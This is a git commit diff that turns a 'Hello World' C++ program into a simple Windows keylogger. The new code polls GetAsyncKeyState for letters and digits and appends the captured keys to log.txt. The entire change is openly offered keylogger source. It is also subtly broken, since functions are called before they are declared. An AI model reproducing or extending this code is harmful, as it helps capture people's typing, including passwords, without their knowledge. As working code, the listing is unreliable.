2b74163b7714b53b7c9704d21a647a7f1c933ded
wabosh <sven.fehlmann6@gmail.com>
2015-06-09 10:20:45 +0200

    Changed "Hello World" to simple Keylogging-Tool.
    For testing purposes ofc.

--- Warm-Cervesia/Warm-Cervesia/Main.cpp
+++ Warm-Cervesia/Warm-Cervesia/Main.cpp
@@ -1,12 +1,55 @@
-#include <iostream>
+#include <windows.h>
+#include <fstream>
+#include <string>
+#include <sstream>
+
 using namespace std;
 
-int main() {
-	int output;
-	cout << "Einagbe: ";
-	cin >> output;
+string input;
+string stringKey;
+int counter;
+ofstream output;
+stringstream sstream;
 
-	cout << output << endl;
-	system("PAUSE");
-	return 0; 
+int main() {
+
+	char chars[] = { "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890" };
+
+	while (true)
+	{
+		for (int i = 0; i < 36; i++)
+		{
+			keys(chars[i]);
+		}
+
+		if (counter >= 5)
+		{
+			flushString();
+		}
+
+		Sleep(50);
+	}
+
+	return 0;
+}
+
+void keys(char key)
+{
+	if (GetAsyncKeyState(key))
+	{
+		sstream << key;
+		sstream >> stringKey;
+		input.append(stringKey);
+		counter++;
+		stringKey = "";
+	}
+}
+
+void flushString()
+{
+	output.open("log.txt", ios::app);
+	output << input;
+	input = "";
+	output.close();
+	counter = 0;
 }
